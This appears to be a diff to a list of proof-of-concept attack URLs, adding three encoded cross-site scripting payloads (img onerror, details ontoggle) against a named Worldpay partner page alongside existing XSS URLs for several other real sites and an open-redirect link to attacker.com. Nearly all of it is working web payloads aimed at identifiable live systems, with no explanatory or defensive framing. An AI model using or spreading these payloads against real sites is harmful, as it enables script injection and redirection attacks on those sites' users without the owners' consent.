@@ -10,6 +10,10 @@ https://bhi.fas.harvard.edu/?s=e%27%22()%26%25%3Czzz%3E%27%22%3E%3Cscript%20src=
 https://customerinsight.ca/CI/index.php?msg=1%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(9365)%3C/ScRiPt%3E
 https://zolostays.com/careers/%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%39%37%31%36%29%3C%2F%73%63%72%69%70%74%3E
 
+https://partnerdiscovery.worldpay.com/partners/?industries=%27--%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e%3c!--
+https://partnerdiscovery.worldpay.com/partners/?industries=%3cdetails+ontoggle%3dalert(1)+open%3etest%3c%2fdetails%3e
+https://partnerdiscovery.worldpay.com/partners/?industries=%3c!--xss%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3e--%3e
+
 Open Redirect POC:
 ------------------
 https://spectrocoin.com/%2fattacker.com/about.html
